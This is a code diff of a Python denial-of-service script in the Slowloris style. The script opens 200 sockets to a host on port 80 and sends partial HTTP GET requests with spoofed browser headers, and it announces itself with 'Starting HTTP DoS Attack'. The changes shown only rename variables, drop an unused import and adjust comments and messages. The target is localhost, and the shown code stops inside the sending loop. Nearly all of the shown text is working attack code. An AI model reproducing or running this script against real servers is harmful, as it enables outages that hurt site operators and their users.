@@ -3,11 +3,10 @@
 import socket
 import random
 import time
-import sys
 
 
 # HTTP Request messages
-headers = [
+request_headers = [
     "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
     "Accept-language: en-US,en"
 ]
@@ -20,18 +19,18 @@ def socketInitialization(host):
     sock.connect((host, 80))
     sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))
 
-    for header in headers:
-        sock.send("{}\r\n".format(header).encode("utf-8"))
+    for i in request_headers:
+        sock.send("{}\r\n".format(i).encode("utf-8"))
 
     return sock
 
 
 if __name__ == "__main__":
-
+    # Target and number of request definition
     host = 'localhost'
     count = 200
 
-    print("Starting DoS Attack on {}. Connecting to {} socket".format(host, count))
+    print("Starting HTTP DoS Attack on {} with {} socket".format(host, count))
 
     for _ in range(count):
         try:
